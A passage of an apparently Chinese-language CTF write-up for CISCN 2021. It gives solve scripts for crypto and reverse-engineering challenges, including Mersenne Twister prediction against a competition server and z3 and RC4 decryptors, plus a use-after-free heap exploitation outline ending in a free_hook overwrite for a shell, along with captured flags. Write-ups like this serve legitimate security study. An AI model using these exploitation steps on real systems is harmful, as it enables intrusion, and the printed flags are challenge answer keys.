class="number">53</span>, <span class="number">105</span>, <span class="number">238</span>, <span class="number">117</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">116</span>, <span class="number">132</span>, <span class="number">195</span>, <span class="number">214</span>, <span class="number">171</span>, <span class="number">113</span>, <span class="number">209</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">194</span>, <span class="number">174</span>, <span class="number">228</span>, <span class="number">212</span>, <span class="number">196</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">211</span>, <span class="number">56</span>, <span class="number">139</span>, <span class="number">135</span>, <span class="number">225</span>, <span class="number">214</span>, <span class="number">89</span>, <span class="number">122</span>, <span class="number">178</span>, <span class="number">212</span>, <span class="number">185</span>, <span class="number">231</span>, <span class="number">204</span>, <span class="number">150</span>, <span class="number">204</span>, <span class="number">212</span>, <span class="number">160</span>, <span class="number">142</span>, <span class="number">213</span>, <span class="number">173</span>, <span class="number">186</span>, <span class="number">166</span>, <span class="number">65</span>, <span class="number">238</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">25</span>, <span class="number">189</span>, <span class="number">148</span>, <span class="number">38</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">227</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">31</span>, <span class="number">189</span>, <span class="number">37</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">249</span>, <span class="number">86</span>, <span class="number">188</span>, <span class="number">86</span>, <span class="number">233</span>, <span class="number">41</span>, <span class="number">250</span>, <span class="number">89</span>, <span class="number">7</span>, <span class="number">212</span>, <span class="number">234</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">245</span>, <span class="number">102</span>, <span class="number">227</span>, <span class="number">96</span>, <span class="number">160</span>, <span class="number">67</span>, <span class="number">181</span>, <span class="number">13</span>, <span class="number">26</span>, <span class="number">192</span>, <span class="number">214</span>, <span class="number">210</span>, <span class="number">188</span>, <span class="number">84</span>, <span class="number">216</span>, <span class="number">215</span>, <span class="number">243</span>, <span class="number">72</span>, <span class="number">233</span>, <span class="number">2</span>, <span class="number">122</span>, <span class="number">166</span>, <span class="number">107</span>, <span class="number">251</span>, <span class="number">70</span>, <span class="number">128</span>, <span class="number">94</span>, <span class="number">190</span>, <span class="number">185</span>, <span class="number">210</span>, <span class="number">34</span>, <span class="number">85</span>, <span class="number">77</span>, <span class="number">29</span>, <span class="number">182</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">208</span>, <span class="number">228</span>, <span class="number">252</span>, <span class="number">73</span>, <span class="number">198</span>, <span class="number">151</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">97</span>, <span class="number">138</span>, <span class="number">235</span>, <span class="number">21</span>, <span class="number">117</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">129</span>, <span class="number">2</span>, <span class="number">253</span>, <span class="number">80</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">184</span>, <span class="number">220</span>, <span class="number">41</span>, <span class="number">82</span>, <span class="number">37</span>, <span class="number">140</span>, <span class="number">23</span>, <span class="number">143</span>, <span class="number">179</span>, <span class="number">53</span>, <span class="number">153</span>, <span class="number">113</span>, <span class="number">213</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">248</span>, <span class="number">65</span>, <span class="number">60</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">81</span>, <span class="number">48</span>, <span class="number">254</span>, <span class="number">251</span>, <span class="number">89</span>, <span class="number">195</span>, <span class="number">8</span>, <span class="number">93</span>, <span class="number">190</span>, <span class="number">66</span>, <span class="number">174</span>, <span class="number">97</span>, <span class="number">175</span>, <span class="number">210</span>, <span class="number">191</span>, <span class="number">66</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">128</span>, <span class="number">33</span>, <span class="number">230</span>, <span class="number">237</span>, <span class="number">104</span>, <span class="number">16</span>, <span class="number">192</span>, <span class="number">239</span>, <span class="number">173</span>, <span class="number">44</span>, <span class="number">10</span>, <span class="number">120</span>, <span class="number">231</span>, <span class="number">114</span>, <span class="number">151</span>, <span class="number">140</span>, <span class="number">63</span>, <span class="number">103</span>, <span class="number">44</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">242</span>, <span class="number">73</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">137</span>, <span class="number">163</span>, <span class="number">152</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">223</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">215</span>, <span class="number">133</span>, <span class="number">131</span>, <span class="number">240</span>, <span class="number">239</span>, <span class="number">224</span>, <span class="number">195</span>, <span class="number">140</span>, <span class="number">124</span>, <span class="number">70</span>, <span class="number">156</span>, <span class="number">221</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">99</span>, <span class="number">9</span>, <span class="number">157</span>, <span class="number">99</span>, <span class="number">150</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">225</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">141</span>, <span class="number">135</span>, <span class="number">99</span>, <span class="number">18</span>, <span class="number">119</span>, <span class="number">63</span>, <span class="number">160</span>, <span class="number">6</span>, <span class="number">247</span>, <span class="number">27</span>, <span class="number">68</span>, <span class="number">45</span>, <span class="number">199</span>, <span class="number">86</span>, <span class="number">193</span>, <span class="number">252</span>, <span class="number">21</span>, <span class="number">135</span>, <span class="number">32</span>, <span class="number">42</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">241</span>, <span class="number">49</span>, <span class="number">249</span>, <span class="number">182</span>, <span class="number">52</span>, <span class="number">18</span>, <span class="number">155</span>, <span class="number">157</span>, <span class="number">61</span>, <span class="number">4</span>, <span class="number">246</span>, <span class="number">158</span>, <span class="number">52</span>, <span class="number">118</span>, <span class="number">242</span>, <span class="number">195</span>, <span class="number">54</span>, <span class="number">139</span>, <span class="number">232</span>, <span class="number">100</span>, <span class="number">31</span>, <span class="number">11</span>, <span class="number">233</span>, <span class="number">58</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">137</span>, <span class="number">83</span>, <span class="number">145</span>, <span class="number">209</span>, <span class="number">7</span>, <span class="number">241</span>, <span class="number">96</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">207</span>, <span class="number">29</span>, <span class="number">237</span>, <span class="number">124</span>, <span class="number">177</span>, <span class="number">166</span>, <span class="number">161</span>, <span class="number">20</span>, <span class="number">116</span>, <span class="number">122</span>, <span class="number">61</span>, <span class="number">71</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">157</span>, <span class="number">253</span>, <span class="number">130</span>, <span class="number">112</span>, <span class="number">66</span>, <span class="number">94</span>, <span class="number">57</span>, <span class="number">221</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">192</span>, <span class="number">147</span>, <span class="number">5</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">174</span>, <span class="number">26</span>, <span class="number">160</span>, <span class="number">16</span>, <span class="number">188</span>, <span class="number">103</span>, <span class="number">187</span>, <span class="number">11</span>, <span class="number">238</span>, <span class="number">182</span>, <span class="number">144</span>, <span class="number">4</span>, <span class="number">137</span>, <span class="number">33</span>, <span class="number">84</span>, <span class="number">100</span>, <span class="number">7</span>, <span class="number">239</span>, <span class="number">219</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">189</span>, <span class="number">166</span>, <span class="number">58</span>, <span class="number">93</span>, <span class="number">141</span>, <span class="number">30</span>, <span class="number">198</span>, <span class="number">220</span>, <span class="number">196</span>, <span class="number">118</span>, <span class="number">172</span>, <span class="number">5</span>, <span class="number">45</span>]</span><br><span class="line">r=<span class="number">1.2</span></span><br><span class="line">key1=<span class="number">169</span></span><br><span class="line">key2=<span class="number">78</span></span><br><span class="line">x0=<span class="number">0.840264</span></span><br><span class="line">m=<span class="number">24</span></span><br><span class="line">n=<span class="number">16</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c,key1,key2,x0,m,n</span>):</span></span><br><span class="line">    flag=[]</span><br><span class="line">    num = m*n//<span class="number">8</span>    </span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        x = generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x  = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            index=n*i+j</span><br><span class="line">            ch=<span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>],<span class="number">2</span>)</span><br><span class="line">            cip=c[index]</span><br><span class="line">            <span class="keyword">if</span> ch==<span class="number">0</span>:</span><br><span class="line">                flag.append(cip^key1)</span><br><span class="line">            <span class="keyword">if</span> ch==<span class="number">1</span>:</span><br><span class="line">                flag.append(~cip^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch==<span class="number">2</span>:</span><br><span class="line">                flag.append(cip^key2)</span><br><span class="line">            <span class="keyword">if</span> ch==<span class="number">3</span>:</span><br><span class="line">                flag.append(~cip^key2)&amp;<span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">flag=decrypt(c,key1,key2,x0,m,n)</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">msg=hashlib.md5((<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,flag))).encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">print(<span class="string">&quot;CSCIN&#123;&quot;</span>+msg+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="homo"><a href="#homo" class="headerlink" title="homo"></a>homo</h2><p>首先是预测随机数也就是破解random，可以直接采用现成的工具，然后通过随机数就可以进入解密，要求输入c0,c1但不能与a,b相同，半蒙半猜的搞出下面的东西，大概就是不要和a,b相同却要a,b相同的作用，那么取最近的试试，还真出了。、？！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> randcrack</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">rc = randcrack.RandCrack()</span><br><span class="line">p=remote(<span class="string">&quot;121.36.14.168&quot;</span>,<span class="number">24303</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">c_0=<span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">c_1=<span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">my_c0=deepcopy(c_0)</span><br><span class="line">my_c0[<span class="number">0</span>]-=<span class="number">1</span></span><br><span class="line">my_c1=deepcopy(c_1)</span><br><span class="line">my_c1[<span class="number">0</span>]+=<span class="number">1</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;2.decrypt&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">mask = (<span class="number">1</span> &lt;&lt; <span class="number">32</span>) - <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;your number:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;lose!my number is &quot;</span>)</span><br><span class="line">    r=<span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>).decode().strip(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">    k=r&gt;&gt;<span class="number">32</span></span><br><span class="line">    w=r&amp;mask</span><br><span class="line">    rc.submit(k)</span><br><span class="line">    rc.submit(w)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;your number:&quot;</span>)</span><br><span class="line">    m=rc.predict_randrange(<span class="number">0</span>, <span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(m))</span><br><span class="line">    </span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)   </span><br><span class="line">p.recvuntil(<span class="string">&quot;c0:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;,&quot;</span>.join(<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> my_c0))</span><br><span class="line">p.recvuntil(<span class="string">&quot;c1:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;,&quot;</span>.join(<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> my_c1))</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment">#解01串，CISCN&#123;kyVjZ-M47XA-jfGgg-XaK2J-R07QH-&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h2><p>在jd-jui中查看主函数</p><p><img src="/2021/05/16/CISCN2021/6.PNG"></p><p>然后在ida里查看so文件</p><p><img src="/2021/05/16/CISCN2021/7.PNG"></p><p><img src="/2021/05/16/CISCN2021/8.PNG"></p><p>解题脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> T[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> S[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">char</span> key[<span class="number">8</span>]=<span class="string">&quot;12345678&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">int</span> <span class="keyword">xor</span>[<span class="number">39</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">            T[i] = key[i % <span class="number">8</span>];</span><br><span class="line">            S[i]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">256</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">            j = (T[i] + j +S[i])%<span class="number">256</span>;</span><br><span class="line">            temp = S[i];</span><br><span class="line">            S[i] = S[j];</span><br><span class="line">            S[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    i = j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> r=<span class="number">0</span>; r&lt;<span class="number">39</span>;r++)</span><br><span class="line">    &#123;</span><br><span class="line">            i = (i+<span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">            j = (j+S[i]) % <span class="number">256</span>;</span><br><span class="line">            temp = S[i];</span><br><span class="line">            S[i] = S[j];</span><br><span class="line">            S[j] = temp;</span><br><span class="line">            t = (S[j]+S[i]) % <span class="number">256</span>;</span><br><span class="line">            <span class="keyword">xor</span>[r]=S[t];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> flag[<span class="number">39</span>] = &#123;<span class="number">0xA3</span>, <span class="number">0x1A</span>, <span class="number">0xE3</span>, <span class="number">0x69</span>, <span class="number">0x2F</span>, <span class="number">0xBB</span>, <span class="number">0x1A</span>, <span class="number">0x84</span>, <span class="number">0x65</span>, <span class="number">0xC2</span>, <span class="number">0xAD</span>, <span class="number">0xAD</span>, <span class="number">0x9E</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x1F</span>, <span class="number">0x8E</span>, <span class="number">0x36</span>, <span class="number">0x4F</span>, <span class="number">0xE1</span>, <span class="number">0xEB</span>, <span class="number">0xAF</span>, <span class="number">0xF0</span>, <span class="number">0xEA</span>, <span class="number">0xC4</span>, <span class="number">0xA8</span>, <span class="number">0x2D</span>, <span class="number">0x42</span>, <span class="number">0xC7</span>, <span class="number">0x6E</span>, <span class="number">0x3F</span>, <span class="number">0xB0</span>, <span class="number">0xD3</span>, <span class="number">0xCC</span>, <span class="number">0x78</span>, <span class="number">0xF9</span>, <span class="number">0x98</span>, <span class="number">0x3F</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> flag2[<span class="number">39</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">39</span>; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i]^= key[i%<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">39</span>;i+=<span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        flag2[i]=flag[i+<span class="number">2</span>]^flag[i+<span class="number">1</span>];</span><br><span class="line">        flag2[i+<span class="number">1</span>]=flag[i]^flag[i+<span class="number">1</span>];</span><br><span class="line">        flag2[i+<span class="number">2</span>]=flag[i]^flag[i+<span class="number">1</span>]^flag[i+<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">39</span>;i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,flag2[i]^<span class="keyword">xor</span>[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">CISCN&#123;<span class="number">6654</span>d84617f627c88846c172e0f4d46c&#125;</span><br></pre></td></tr></table></figure><h2 id="baby-bc"><a href="#baby-bc" class="headerlink" title="baby_bc"></a>baby_bc</h2><p>LLVM-Clang编译器+z3</p><blockquote><p>llc baby.bc -obaby.s<br>clang++baby.o -obaby</p></blockquote><p>然后就能拖入ida中反汇编，这是个数独，用z3添加约束，得出flag后进行MD5。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">n = [[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],[<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]]</span><br><span class="line">o = [[<span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>], [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]]</span><br><span class="line">s = Solver()</span><br><span class="line">m = [[Int(<span class="string">&#x27;x&#x27;</span>+<span class="built_in">str</span>(i)+<span class="built_in">str</span>(j)) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">print(m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        s.add(m[i][j]&gt;<span class="number">0</span>)</span><br><span class="line">        s.add(m[i][j]&lt;<span class="number">6</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(j):</span><br><span class="line">            s.add(m[i][j]!=m[i][k])</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">            s.add(m[i][j]!=m[k][j])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> n[i][j]==<span class="number">1</span>:</span><br><span class="line">            s.add(m[i][j]&gt;m[i][j+<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">elif</span> n[i][j] == <span class="number">2</span>:</span><br><span class="line">            s.add(m[i][j]&lt;m[i][j+<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">if</span> o[i][j]==<span class="number">2</span>:</span><br><span class="line">            s.add(m[i][j]&gt;m[i+<span class="number">1</span>][j])</span><br><span class="line">        <span class="keyword">elif</span> o[i][j]==<span class="number">1</span>:</span><br><span class="line">            s.add(m[i][j]&lt;m[i+<span class="number">1</span>][j])</span><br><span class="line">s.add(m[<span class="number">2</span>][<span class="number">2</span>]==<span class="number">4</span>)</span><br><span class="line">s.add(m[<span class="number">3</span>][<span class="number">3</span>]==<span class="number">3</span>)</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    print(s.model())</span><br><span class="line">flag=<span class="number">1425353142350212150442315</span></span><br><span class="line"><span class="comment">#CISCN&#123;8a04b4597ad08b83211d3adfa1f61431&#125;</span></span><br></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h2><p>uaf，edit泄露出chunk00_size</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">      __printf_chk(<span class="number">1L</span>L, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      v0 = buf;</span><br><span class="line">      <span class="keyword">if</span> ( size )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 = (<span class="keyword">char</span> *)buf + size;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          read(<span class="number">0</span>, v0, <span class="number">1u</span>LL);</span><br><span class="line">          <span class="keyword">if</span> ( *v0 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( ++v0 == v1 )   <span class="comment">//由于当申请小于0x20的堆块时，都会申请到0x20的size，利用这一行可以控制输入8字节字符，show带出chunk00_addr</span></span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">        &#125;</span><br><span class="line">        *v0 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>泄露出chunk00_size后，再改掉其中一个chunk的size&gt;0x40，free掉，show，就可以泄露出libc地址了<br>泄露libc后，修改free_hook为onegadget，getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 